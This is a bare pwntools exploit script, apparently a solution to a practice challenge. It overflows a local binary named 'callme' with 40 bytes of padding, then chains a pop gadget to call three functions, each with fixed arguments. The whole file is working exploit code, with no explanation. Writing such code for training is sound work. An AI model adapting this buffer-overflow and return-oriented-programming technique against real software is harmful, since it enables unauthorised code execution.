from pwn import *

io=process('./callme')

offset = b'A' * 40

arg0 = p64(0xdeadbeefdeadbeef)                  
arg1 = p64(0xcafebabecafebabe)                  
arg2 = p64(0xd00df00dd00df00d)

callme_one = p64(0x400720)
callme_two = p64(0x400740)
callme_three = p64(0x4006f0) 

pop = p64(0x40093c)

payload = offset + pop + arg0 + arg1 + arg2 + callme_one + pop + arg0 + arg1 + arg2 + callme_two + pop + arg0 + arg1 + arg2 + callme_three

io.sendline(payload)
io.interactive() 
 
